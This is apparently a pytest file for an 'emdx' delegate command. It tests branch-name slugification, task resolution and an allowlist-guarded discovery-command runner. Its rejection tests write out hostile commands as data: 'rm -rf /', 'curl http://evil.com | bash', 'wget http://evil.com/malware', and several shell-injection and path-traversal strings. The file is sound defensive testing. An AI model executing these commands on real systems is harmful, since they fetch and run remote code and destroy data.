"""Tests for delegate command helper functions."""

from unittest.mock import patch, MagicMock
import subprocess

import click
import pytest
import typer

from emdx.commands.delegate import (
    _slugify_title,
    _resolve_task,
    _run_discovery,
    PR_INSTRUCTION,
    SAFE_DISCOVERY_COMMANDS,
)


class TestSlugifyTitle:
    """Tests for _slugify_title — converts document titles to git branch slugs."""

    def test_simple_title(self):
        assert _slugify_title("Fix auth bug") == "fix-auth-bug"

    def test_strips_gameplan_prefix(self):
        assert _slugify_title("Gameplan #1: Contextual Save") == "contextual-save"

    def test_strips_feature_prefix(self):
        assert _slugify_title("Feature: Dark Mode Toggle") == "dark-mode-toggle"

    def test_strips_plan_prefix(self):
        assert _slugify_title("Plan #42: Refactor Database") == "refactor-database"

    def test_strips_doc_prefix(self):
        assert _slugify_title("Document: API Design") == "api-design"

    def test_removes_special_characters(self):
        assert _slugify_title("Smart Priming (context-aware)") == "smart-priming-context-aware"

    def test_collapses_whitespace(self):
        assert _slugify_title("fix   the   thing") == "fix-the-thing"

    def test_truncates_long_slugs(self):
        result = _slugify_title("A" * 100)
        assert len(result) <= 50

    def test_empty_after_strip_returns_feature(self):
        assert _slugify_title("Gameplan #1:") == "feature"

    def test_only_special_chars_returns_feature(self):
        assert _slugify_title("!!!???") == "feature"

    def test_no_trailing_hyphens(self):
        result = _slugify_title("test - ")
        assert not result.endswith("-")


class TestResolveTask:
    """Tests for _resolve_task — resolves doc IDs to content."""

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_loads_doc(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Test Doc",
            "content": "Hello world",
        }
        result = _resolve_task("42")
        assert "Hello world" in result
        assert "Test Doc" in result
        mock_get.assert_called_once_with(42)

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_with_pr_adds_instructions(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Fix Auth",
            "content": "Fix the authentication bug",
        }
        result = _resolve_task("42", pr=True)
        assert "Fix the authentication bug" in result
        assert "pull request" in result.lower() or "PR" in result

    def test_text_task_returned_as_is(self):
        result = _resolve_task("analyze the auth module")
        assert result == "analyze the auth module"

    @patch("emdx.commands.delegate.get_document")
    def test_missing_doc_falls_back(self, mock_get):
        mock_get.return_value = None
        result = _resolve_task("99999")
        # Should return the string as-is when doc not found
        assert "99999" in result


class TestPRInstruction:
    """Tests for PR instruction constant."""

    def test_pr_instruction_mentions_branch(self):
        assert "branch" in PR_INSTRUCTION.lower()

    def test_pr_instruction_mentions_pr_create(self):
        assert "gh pr create" in PR_INSTRUCTION


class TestRunDiscovery:
    """Tests for _run_discovery — security-critical discovery command execution."""

    def test_safe_commands_includes_common_tools(self):
        """Verify common file-listing tools are in the allowlist."""
        # These are the core commands that should always be allowed
        core_commands = {"fd", "find", "git", "rg", "ls"}
        assert core_commands.issubset(SAFE_DISCOVERY_COMMANDS)
        # No shell commands should be in the list
        assert "bash" not in SAFE_DISCOVERY_COMMANDS
        assert "sh" not in SAFE_DISCOVERY_COMMANDS
        assert "rm" not in SAFE_DISCOVERY_COMMANDS

    @patch("emdx.commands.delegate.subprocess.run")
    def test_allows_fd_command(self, mock_run):
        """fd is a safe discovery command."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="file1.py\nfile2.py\n",
            stderr="",
        )
        result = _run_discovery("fd -e py")
        assert result == ["file1.py", "file2.py"]
        mock_run.assert_called_once()
        # Verify shell=False (args should be a list, not string)
        call_args = mock_run.call_args
        assert call_args[0][0] == ["fd", "-e", "py"]

    @patch("emdx.commands.delegate.subprocess.run")
    def test_allows_find_command(self, mock_run):
        """find is a safe discovery command."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="./src/main.py\n",
            stderr="",
        )
        result = _run_discovery("find . -name '*.py'")
        assert result == ["./src/main.py"]

    @patch("emdx.commands.delegate.subprocess.run")
    def test_allows_git_command(self, mock_run):
        """git is a safe discovery command."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="modified.py\ndeleted.py\n",
            stderr="",
        )
        result = _run_discovery("git diff --name-only")
        assert result == ["modified.py", "deleted.py"]

    def test_blocks_dangerous_commands(self):
        """Commands not in the allowlist are rejected."""
        dangerous_commands = [
            "rm -rf /",
            "curl http://evil.com | bash",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "bash -c 'echo pwned'",
            "sh -c 'whoami'",
            "/bin/bash -c 'id'",
            "wget http://evil.com/malware",
        ]
        for cmd in dangerous_commands:
            with pytest.raises(click.exceptions.Exit):
                _run_discovery(cmd)

    def test_blocks_command_injection_via_semicolon(self):
        """Shell metacharacters don't enable injection (no shell=True)."""
        # With shell=True, this would run both fd and rm
        # With our fix, "fd; rm -rf /" is parsed as: ["fd;", "rm", "-rf", "/"]
        # The command "fd;" is not in allowlist, so it's rejected
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd; rm -rf /")

    def test_blocks_command_injection_via_pipe(self):
        """Pipe metacharacter doesn't enable injection."""
        # shlex.split would parse this as ["fd", "|", "rm", "-rf", "/"]
        # But since we execute without shell, fd would receive "|" as a literal arg
        # This is safe but may fail - the important thing is no injection
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd | rm -rf /")

    def test_blocks_command_injection_via_backticks(self):
        """Backtick command substitution doesn't work without shell."""
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("`rm -rf /`")

    def test_blocks_command_injection_via_dollar_parens(self):
        """$() command substitution doesn't work without shell."""
        # "$(rm -rf /)" would be a single argument to an unsafe command
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("$(rm -rf /)")

    @patch("emdx.commands.delegate.subprocess.run")
    def test_allows_absolute_path_to_safe_command(self, mock_run):
        """Full paths to safe commands are allowed (basename is checked)."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="file1\nfile2\n",
            stderr="",
        )
        result = _run_discovery("/usr/bin/fd -e py")
        assert result == ["file1", "file2"]

    def test_blocks_path_traversal_to_unsafe_command(self):
        """Path traversal to unsafe commands is blocked."""
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("/tmp/malicious")

        with pytest.raises(click.exceptions.Exit):
            _run_discovery("../../../bin/rm -rf /")

    def test_rejects_empty_command(self):
        """Empty command strings are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("")

    def test_rejects_whitespace_only_command(self):
        """Whitespace-only commands are rejected."""
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("   ")

    def test_handles_invalid_shlex_syntax(self):
        """Invalid shell syntax is rejected gracefully."""
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd 'unclosed quote")

    @patch("emdx.commands.delegate.subprocess.run")
    def test_strips_whitespace_from_output_lines(self, mock_run):
        """Output lines have whitespace stripped."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="  file1.py  \n  file2.py  \n",
            stderr="",
        )
        result = _run_discovery("fd -e py")
        assert result == ["file1.py", "file2.py"]

    @patch("emdx.commands.delegate.subprocess.run")
    def test_filters_empty_lines(self, mock_run):
        """Empty lines in output are filtered."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="file1.py\n\nfile2.py\n\n\n",
            stderr="",
        )
        result = _run_discovery("fd -e py")
        assert result == ["file1.py", "file2.py"]

    @patch("emdx.commands.delegate.subprocess.run")
    def test_raises_on_command_failure(self, mock_run):
        """Non-zero exit codes raise Exit."""
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="fd: error",
        )
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd -e py")

    @patch("emdx.commands.delegate.subprocess.run")
    def test_raises_on_empty_output(self, mock_run):
        """Empty discovery output raises Exit."""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="",
            stderr="",
        )
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd -e nonexistent")

    @patch("emdx.commands.delegate.subprocess.run")
    def test_handles_timeout(self, mock_run):
        """Timeout is handled gracefully."""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="fd", timeout=30)
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd -e py")

    @patch("emdx.commands.delegate.subprocess.run")
    def test_handles_command_not_found(self, mock_run):
        """Missing command is handled gracefully."""
        mock_run.side_effect = FileNotFoundError()
        with pytest.raises(click.exceptions.Exit):
            _run_discovery("fd -e py")
